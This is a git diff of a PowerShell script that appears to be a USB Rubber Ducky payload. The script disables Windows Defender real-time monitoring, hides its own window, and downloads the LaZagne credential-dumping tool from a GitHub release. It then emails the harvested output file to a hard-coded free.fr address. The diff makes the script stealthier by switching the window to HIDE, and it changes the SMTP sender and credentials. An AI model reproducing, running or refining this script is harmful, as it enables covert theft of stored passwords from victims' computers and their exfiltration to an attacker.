@@ -80,7 +80,7 @@ Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
 # Disable real time protection
 Set-MpPreference -DisableRealtimeMonitoring $true
 # Minimize window 
-Get-Process -ID $PID | Set-WindowState -State SHOW #HIDE
+Get-Process -ID $PID | Set-WindowState -State HIDE
 # Create a tmp directory in the Downloads folder
 $dir = "C:\Users\$env:UserName\Downloads\tmp"
 New-Item -ItemType Directory -Path $dir
@@ -100,17 +100,14 @@ Invoke-WebRequest -Uri "https://github.com/olag4277/LaZagne/releases/download/v2
 
 #Mail Exfiltration
 $smtp = "smtp.free.fr"
-$From = "olag4277"
+$From = "ducky@free.fr"
 $To = "olag4277@free.fr"
 #$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
 $Subject = "Ducky Rapport"
 $Body = "Hi, here is the Rapport"
 
-# The password is an app-specific password if you have 2-factor-auth enabled
-$Password = "" | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 # The smtp server used to send the file
-Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
+Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl
 
 # Clean up
 #Remove-Item -Path $dir -Recurse -Force
